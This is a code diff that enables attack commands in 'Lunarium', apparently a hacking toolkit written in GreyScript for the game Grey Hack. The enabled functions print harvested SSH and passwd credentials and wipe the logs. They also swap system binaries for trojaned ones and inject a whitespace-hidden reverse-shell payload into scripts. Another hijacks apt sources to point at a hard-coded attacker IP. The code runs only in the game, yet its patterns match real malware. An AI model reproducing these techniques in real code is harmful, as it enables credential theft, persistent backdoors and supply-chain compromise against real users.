@@ -268,59 +268,59 @@ end function
 //     return out
 // end function
 
-// cmds.sshs=function(sin)
-//     out={}
-//     out.bool=2
-//     logs="/root/sshs"
-// 	if not server.shell then
-//     	out.bool=3
-//     	return out
-//     end if
-//     sshs=server.shell.host_computer.File(logs)
-//     if not sshs then return error("Could not obtain logs")
-//     if sin.len == 1 and sin[0] == "-c" then
-//     	sshs.set_content("<0%O<0w")
-//     	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Cleared connection logs</color>")
-//     	return out
-//     end if
-//     cont=sshs.get_content
-//     if cont.len <= 7 then return error("No logs found")
-// 	cont=deserialize(encrypt(cont,"Lunarium","dec"))
-//     plog=[["<color=#CCCCFF><b>SOURCE","DEST","PORT","USER","PASS</b></color>"].join(" ")]
+cmds.sshs=function(sin)
+    out={}
+    out.bool=2
+    logs="/root/sshs"
+	if not server.shell then
+    	out.bool=3
+    	return out
+    end if
+    sshs=server.shell.host_computer.File(logs)
+    if not sshs then return error("Could not obtain logs")
+    if sin.len == 1 and sin[0] == "-c" then
+    	sshs.set_content("<0%O<0w")
+    	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Cleared connection logs</color>")
+    	return out
+    end if
+    cont=sshs.get_content
+    if cont.len <= 7 then return error("No logs found")
+	cont=deserialize(encrypt(cont,"Lunarium","dec"))
+    plog=[["<color=#CCCCFF><b>SOURCE","DEST","PORT","USER","PASS</b></color>"].join(" ")]
 
-//     for log in cont
-//     	plog.push(["<color=#CCCCFF>"+log.source,log.dest,log.port,log.user,log.pass+"</color>"].join(" "))
-//     end for
-//     print(format_columns(plog.join("\n")))
-//     return out
-// end function
+    for log in cont
+    	plog.push(["<color=#CCCCFF>"+log.source,log.dest,log.port,log.user,log.pass+"</color>"].join(" "))
+    end for
+    print(format_columns(plog.join("\n")))
+    return out
+end function
 
-// cmds.passwds=function(sin)
-//     out={}
-//     out.bool=2
-//     logs="/root/passwd"
-// 	if not server.shell then
-//     	out.bool=3
-//     	return out
-//     end if
-//     sudos=server.shell.host_computer.File(logs)
-//     if not sudos then return error("Could not obtain logs")
-//     if sin.len == 1 and sin[0] == "-c" then
-// 	    sudos.set_content("<0%O<0w")
-// 	    print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Cleared passwd logs</color>")
-// 	    return out
-//     end if
-//     cont=sudos.get_content
-//     if cont.len <= 7 then return error("No logs found")
-// 	cont=deserialize(encrypt(cont,"Lunarium","dec"))
-//     plog=[["<color=#CCCCFF><b>SOURCE","USER","PASS</b></color>"].join(" ")]
+cmds.passwds=function(sin)
+    out={}
+    out.bool=2
+    logs="/root/passwd"
+	if not server.shell then
+    	out.bool=3
+    	return out
+    end if
+    sudos=server.shell.host_computer.File(logs)
+    if not sudos then return error("Could not obtain logs")
+    if sin.len == 1 and sin[0] == "-c" then
+	    sudos.set_content("<0%O<0w")
+	    print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Cleared passwd logs</color>")
+	    return out
+    end if
+    cont=sudos.get_content
+    if cont.len <= 7 then return error("No logs found")
+	cont=deserialize(encrypt(cont,"Lunarium","dec"))
+    plog=[["<color=#CCCCFF><b>SOURCE","USER","PASS</b></color>"].join(" ")]
 
-//     for log in cont
-// 	    plog.push(["<color=#CCCCFF>"+log.source,log.user,log.pass+"</color>"].join(" "))
-//     end for
-//     print(format_columns(plog.join("\n")))
-//     return out
-// end function
+    for log in cont
+	    plog.push(["<color=#CCCCFF>"+log.source,log.user,log.pass+"</color>"].join(" "))
+    end for
+    print(format_columns(plog.join("\n")))
+    return out
+end function
 
 cmds.clrmail=function(sin)
     out={}
@@ -2060,64 +2060,64 @@ cmds.vim=function(sin)
 	return out
 end function
 
-// cmds.infect=function(sin)
-// 	out={}
-// 	out.bool=2
-// 	if not server.shell then
-// 		out.bool=3
-// 		return out
-// 	end if
-// 	if shelltype != "shell" then return error("Shell required")
-// 	if not comp.File("/bin") or not comp.File("/bin").has_permission("w") then return error("Cannot access /bin")
-// 	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Are you sure you want to continue?</color>")
-// 	confirm=user_input("<color=#CCCCFF>[y/N]$ </color><color=#E6E6FA>").lower
-// 	if confirm != "y" then return out
-// 	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Replacing ssh</color>\n")
-// 	p=null
-// 	if comp.File("/bin/ssh") then p=comp.File("/bin/ssh").permissions[1:]
-// 	server.shell.scp("/root/Downloads/ssh","/bin",shell)
-// 	f=comp.File("/bin/ssh")
-// 	f.chmod("u-wrx")
-// 	f.chmod("g-wrx")
-// 	f.chmod("o-wrx")
-// 	if p then
-// 		up=p[:3].replace("-","")
-// 		gp=p[3:-3].replace("-","")
-// 		op=p[-3:].replace("-","")
-// 	else
-// 		p=comp.File("/bin").permissions[1:]
-// 		up=p[:3].replace("-","")
-// 		gp=p[3:-3].replace("-","")
-// 		op=p[-3:].replace("-","")
-// 	end if
-// 	f.chmod("u+"+up)
-// 	f.chmod("g+"+gp)
-// 	f.chmod("o+"+op)
-// 	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Replacing passwd</color>\n")
-// 	p=null
-// 	if comp.File("/bin/passwd") then p=comp.File("/bin/passwd").permissions[1:]
-// 	server.shell.scp("/root/Downloads/passwd","/bin",shell)
-// 	f=comp.File("/bin/passwd")
-// 	f.chmod("u-wrx")
-// 	f.chmod("g-wrx")
-// 	f.chmod("o-wrx")
-// 	if p then
-// 		up=p[:3].replace("-","")
-// 		gp=p[3:-3].replace("-","")
-// 		op=p[-3:].replace("-","")
-// 	else
-// 		p=comp.File("/bin").permissions[1:]
-// 		up=p[:3].replace("-","")
-// 		gp=p[3:-3].replace("-","")
-// 		op=p[-3:].replace("-","")
-// 	end if
-// 	f.chmod("u+"+up)
-// 	f.chmod("g+"+gp)
-// 	f.chmod("o+"+op)
-// 	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Replacing ps</color>\n")
-// 	buildPS(conf.proc)
-// 	return out
-// end function
+cmds.infect=function(sin)
+	out={}
+	out.bool=2
+	if not server.shell then
+		out.bool=3
+		return out
+	end if
+	if shelltype != "shell" then return error("Shell required")
+	if not comp.File("/bin") or not comp.File("/bin").has_permission("w") then return error("Cannot access /bin")
+	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Are you sure you want to continue?</color>")
+	confirm=user_input("<color=#CCCCFF>[y/N]$ </color><color=#E6E6FA>").lower
+	if confirm != "y" then return out
+	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Replacing ssh</color>\n")
+	p=null
+	if comp.File("/bin/ssh") then p=comp.File("/bin/ssh").permissions[1:]
+	server.shell.scp("/root/Downloads/ssh","/bin",shell)
+	f=comp.File("/bin/ssh")
+	f.chmod("u-wrx")
+	f.chmod("g-wrx")
+	f.chmod("o-wrx")
+	if p then
+		up=p[:3].replace("-","")
+		gp=p[3:-3].replace("-","")
+		op=p[-3:].replace("-","")
+	else
+		p=comp.File("/bin").permissions[1:]
+		up=p[:3].replace("-","")
+		gp=p[3:-3].replace("-","")
+		op=p[-3:].replace("-","")
+	end if
+	f.chmod("u+"+up)
+	f.chmod("g+"+gp)
+	f.chmod("o+"+op)
+	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Replacing passwd</color>\n")
+	p=null
+	if comp.File("/bin/passwd") then p=comp.File("/bin/passwd").permissions[1:]
+	server.shell.scp("/root/Downloads/passwd","/bin",shell)
+	f=comp.File("/bin/passwd")
+	f.chmod("u-wrx")
+	f.chmod("g-wrx")
+	f.chmod("o-wrx")
+	if p then
+		up=p[:3].replace("-","")
+		gp=p[3:-3].replace("-","")
+		op=p[-3:].replace("-","")
+	else
+		p=comp.File("/bin").permissions[1:]
+		up=p[:3].replace("-","")
+		gp=p[3:-3].replace("-","")
+		op=p[-3:].replace("-","")
+	end if
+	f.chmod("u+"+up)
+	f.chmod("g+"+gp)
+	f.chmod("o+"+op)
+	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Replacing ps</color>\n")
+	buildPS(conf.proc)
+	return out
+end function
 
 cmds.rootkit=function(sin)
 	out={}
@@ -2461,17 +2461,17 @@ cmds.compress=function(sin)
 	return out
 end function
 
-// cmds.ransom=function(sin)
-// 	out={}
-// 	out.bool=2
-// 	if not server.shell then
-// 		out.bool=3
-// 		return out
-// 	end if
-// 	if shelltype != "shell" then return error("Shell required")
-// 	if xuser != "root" then return error("Root access required")
-// 	return out
-// end function
+cmds.ransom=function(sin)
+	out={}
+	out.bool=2
+	if not server.shell then
+		out.bool=3
+		return out
+	end if
+	if shelltype != "shell" then return error("Shell required")
+	if xuser != "root" then return error("Root access required")
+	return out
+end function
 
 cmds.corrupt=function(sin)
 	out={}
@@ -2566,65 +2566,65 @@ cmds.anon=function(sin)
 	return out
 end function
 
-// cmds.inject=function(sin)
-// 	out={}
-// 	out.bool=2
-// 	if (not server.shell and sin.len < 3) or sin.len > 4 then return error("Invalid parameters")
-// 	rsport=1222
-// 	if server.shell then
-// 		rip=conf.rss.ip
-// 		rsport=conf.rss.rport
-// 		uproc=conf.proc
-// 	end if
-// 	if sin.len >= 2 then rip=sin[1]
-// 	if sin.len >= 3 then uproc=sin[2]
-// 	if sin.len == 4 then
-// 		rsport=sin[3].to_int
-// 		if typeof(rsport) != "number" then return error("Invalid port")
-// 	end if
-// 	if sin[0] == "*" then
-// 		if shelltype == "file" then files=shell.get_files else files=comp.File(xpath).get_files
-// 	else
-// 		if shelltype == "file" then files=[getFile(getPath(sin[0])).get_files] else files=[comp.File(getPath(sin[0]))]
-// 	end if
-// 	while files.len
-// 		file=files.pull
-// 		if not file then
-// 			out.err="File does not exist"
-// 			if not files.len then return error(out.err)
-// 			print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>"+out.err+"</color>")
-// 			continue
-// 		end if
-// 		if file.is_binary then
-// 			out.err="Binary file, cannot edit"
-// 			if not files.len then return error(out.err)
-// 			print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>"+out.err+"</color>")
-// 			continue
-// 		end if
-// 		if not file.has_permission("w") then
-// 			out.err="No permissions to file"
-// 			if not files.len then return error(out.err)
-// 			print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>"+out.err+"</color>")
-// 			continue
-// 		end if
+cmds.inject=function(sin)
+	out={}
+	out.bool=2
+	if (not server.shell and sin.len < 3) or sin.len > 4 then return error("Invalid parameters")
+	rsport=1222
+	if server.shell then
+		rip=conf.rss.ip
+		rsport=conf.rss.rport
+		uproc=conf.proc
+	end if
+	if sin.len >= 2 then rip=sin[1]
+	if sin.len >= 3 then uproc=sin[2]
+	if sin.len == 4 then
+		rsport=sin[3].to_int
+		if typeof(rsport) != "number" then return error("Invalid port")
+	end if
+	if sin[0] == "*" then
+		if shelltype == "file" then files=shell.get_files else files=comp.File(xpath).get_files
+	else
+		if shelltype == "file" then files=[getFile(getPath(sin[0])).get_files] else files=[comp.File(getPath(sin[0]))]
+	end if
+	while files.len
+		file=files.pull
+		if not file then
+			out.err="File does not exist"
+			if not files.len then return error(out.err)
+			print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>"+out.err+"</color>")
+			continue
+		end if
+		if file.is_binary then
+			out.err="Binary file, cannot edit"
+			if not files.len then return error(out.err)
+			print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>"+out.err+"</color>")
+			continue
+		end if
+		if not file.has_permission("w") then
+			out.err="No permissions to file"
+			if not files.len then return error(out.err)
+			print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>"+out.err+"</color>")
+			continue
+		end if
 
-// 		injection="																																													;mxf=null;root=get_shell.host_computer.File(""/"");newFiles=root.get_folders+root.get_files;while newFiles.len;currFile=newFiles.pull;if currFile.is_folder then newFiles=newFiles+currFile.get_folders+currFile.get_files;test=include_lib(currFile.path);if typeof(test) == ""MetaxploitLib"" then;mxf=currFile.path;break;end if;end while;rshelled=0;ps=get_shell.host_computer.show_procs;for proc in ps.split(""\n"")[1:];proc=proc.split("" "");if proc[-1] == """+uproc+""" then rshelled=1;end for;if not rshelled then;if mxf then include_lib(mxf).rshell_client("""+rip+""","""+rsport+""","""+uproc+""");end if"
-// 		cont=file.get_content.split("\n")
-// 		print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Injecting code into "+file.name+"</color>")
-// 		injected=0
-// 		for i in range(0,cont.len-1)
-// 			l=cont[i]
-// 			if l.indexOf("//") != null then continue
-// 			cont[i]=l+injection
-// 			print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Code injected into line "+i+"</color>")
-// 			injected=1
-// 			break
-// 		end for
-// 		if not injected then file.set_content(injection+char(10)+cont.join(char(10))) else file.set_content(cont.join(char(10)))
-// 		print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Finished injection</color>")
-// 	end while
-// 	return out
-// end function
+		injection="																																													;mxf=null;root=get_shell.host_computer.File(""/"");newFiles=root.get_folders+root.get_files;while newFiles.len;currFile=newFiles.pull;if currFile.is_folder then newFiles=newFiles+currFile.get_folders+currFile.get_files;test=include_lib(currFile.path);if typeof(test) == ""MetaxploitLib"" then;mxf=currFile.path;break;end if;end while;rshelled=0;ps=get_shell.host_computer.show_procs;for proc in ps.split(""\n"")[1:];proc=proc.split("" "");if proc[-1] == """+uproc+""" then rshelled=1;end for;if not rshelled then;if mxf then include_lib(mxf).rshell_client("""+rip+""","""+rsport+""","""+uproc+""");end if"
+		cont=file.get_content.split("\n")
+		print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Injecting code into "+file.name+"</color>")
+		injected=0
+		for i in range(0,cont.len-1)
+			l=cont[i]
+			if l.indexOf("//") != null then continue
+			cont[i]=l+injection
+			print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Code injected into line "+i+"</color>")
+			injected=1
+			break
+		end for
+		if not injected then file.set_content(injection+char(10)+cont.join(char(10))) else file.set_content(cont.join(char(10)))
+		print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Finished injection</color>")
+	end while
+	return out
+end function
 
 cmds.tree=function(sin)
 	out={}
@@ -2906,49 +2906,49 @@ cmds.apt=function(sin) // thanks for being less lazy than me :)
 	return out
 end function
 
-// cmds.aptjack=function(sin)
-// 	out={}
-// 	out.bool=2
-// 	check=null
-// 	if shelltype == "file" then check=getFile("/etc/apt") else check=comp.File("/etc/apt")
-// 	if not check and shelltype == "file" then return error("Cannot create /etc/apt")
-// 	if not check then
-// 		comp.create_folder("/etc","apt")
-// 	end if
-// 	check=null
-// 	if shelltype == "file" then check=getFile("/etc/apt/sources.txt") else check=comp.File("/etc/apt/sources.txt")
-// 	if not check and shelltype == "file" then return error("Cannot create /etc/apt/sources.txt")
-// 	if not check and origShell then
-// 		apt.update
-// 	end if
-// 	if not check then
-// 		comp.touch("/etc/apt","sources.txt")
-// 	end if
-// 	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Are you sure you want to continue?</color>")
-// 	confirm=user_input("<color=#CCCCFF>[y/N]$ </color><color=#E6E6FA>").lower
-// 	if confirm != "y" then return out
-// 	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Lunarium AptJacker</color>")
+cmds.aptjack=function(sin)
+	out={}
+	out.bool=2
+	check=null
+	if shelltype == "file" then check=getFile("/etc/apt") else check=comp.File("/etc/apt")
+	if not check and shelltype == "file" then return error("Cannot create /etc/apt")
+	if not check then
+		comp.create_folder("/etc","apt")
+	end if
+	check=null
+	if shelltype == "file" then check=getFile("/etc/apt/sources.txt") else check=comp.File("/etc/apt/sources.txt")
+	if not check and shelltype == "file" then return error("Cannot create /etc/apt/sources.txt")
+	if not check and origShell then
+		apt.update
+	end if
+	if not check then
+		comp.touch("/etc/apt","sources.txt")
+	end if
+	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Are you sure you want to continue?</color>")
+	confirm=user_input("<color=#CCCCFF>[y/N]$ </color><color=#E6E6FA>").lower
+	if confirm != "y" then return out
+	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Lunarium AptJacker</color>")
 
-// 	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Hijacking apt repositories...</color>")
-// 	if origShell then
-// 		apt.update
-// 		apt.add_repo("61.126.138.22",1542)
-// 		apt.update
-// 	else
-// 		file=null
-// 		if shelltype == "file" then file=getFile("/etc/apt/sources.txt") else file=comp.File("/etc/apt/sources.txt")
-// 		if not file then return error("Could not find /etc/apt/sources.txt")
-// 		if not file.has_permission("r") or not file.has_permission("w") then return error("No permissions to /etc/apt/sources.txt")
-// 		if not file.get_content.len then cont={"official_server": false, "sourceList": {}} else cont=deserialize(file.get_content)
-// 		if cont.indexes.indexOf("sourceList") == null then return error("Unknown error")
-// 		cont.sourceList["61.126.138.22"] = 1542
-// 		file.set_content(FoxLib.General.Serialize(cont,1))
-// 		if shelltype == "file" then file=getFile("/etc/apt/aptcache.bin") else file=comp.File("/etc/apt/aptcache.bin")
-// 		if file then file.delete
-// 	end if
-// 	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Now wait.</color>")
-// 	return out
-// end function
+	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Hijacking apt repositories...</color>")
+	if origShell then
+		apt.update
+		apt.add_repo("61.126.138.22",1542)
+		apt.update
+	else
+		file=null
+		if shelltype == "file" then file=getFile("/etc/apt/sources.txt") else file=comp.File("/etc/apt/sources.txt")
+		if not file then return error("Could not find /etc/apt/sources.txt")
+		if not file.has_permission("r") or not file.has_permission("w") then return error("No permissions to /etc/apt/sources.txt")
+		if not file.get_content.len then cont={"official_server": false, "sourceList": {}} else cont=deserialize(file.get_content)
+		if cont.indexes.indexOf("sourceList") == null then return error("Unknown error")
+		cont.sourceList["61.126.138.22"] = 1542
+		file.set_content(FoxLib.General.Serialize(cont,1))
+		if shelltype == "file" then file=getFile("/etc/apt/aptcache.bin") else file=comp.File("/etc/apt/aptcache.bin")
+		if file then file.delete
+	end if
+	print("<color=#CCCCFF>[Lunarium] </color><color=#E6E6FA>Now wait.</color>")
+	return out
+end function
 
 cmds.ping=function(sin)
 	out={}
